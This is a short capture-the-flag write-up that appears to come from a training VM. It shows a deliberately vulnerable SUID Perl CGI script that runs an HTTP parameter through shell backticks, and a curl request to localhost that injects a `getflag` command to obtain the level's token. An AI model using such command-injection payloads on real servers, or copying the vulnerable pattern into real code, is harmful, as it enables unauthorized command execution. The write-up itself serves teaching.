### Solution

1. **List files in the home directory:**

	```bash
	ls -l
	```

	You’ll see the following SUID Perl script:

	```
	-rwsr-sr-x 1 flag04 level04 152 Mar  5  2016 level04.pl
	```

	This script is **owned by `flag04`** and **has the SUID bit set**, meaning it executes with `flag04`'s privileges when run — even from a web request.

2. **Analyze the script source code.**

	View the script:

	```bash
	cat level04.pl
	```

	You’ll find:

	```perl
	#!/usr/bin/perl
	# localhost:4747
	use CGI qw{param};
	print "Content-type: text/html\n\n";
	sub x {
	$y = $_[0];
	print `echo $y 2>&1`;
	}
	x(param("x"));
	```

	The script:

	* Imports `param()` from the CGI module to read HTTP parameters.
	* Passes the user input **directly into backticks**, which runs it as a shell command.
	* This results in a classic **command injection vulnerability**.

3. **Exploit the vulnerable CGI parameter.**

	You can interact with the web service locally using `curl`:

	```bash
	curl 'http://localhost:4747/level04.pl?x=hello'
	```

	Output:

	```
	hello
	```

	This proves it’s executing `echo hello`.

	Now inject a shell command:

	```bash
	curl 'http://localhost:4747/level04.pl?x=`getflag`'
	```

	Output:

	```
	Check flag.Here is your token : ne2searoevaevoem4ov4ar8ap
	```

	You’ve successfully executed `getflag` with `flag04`’s privileges.
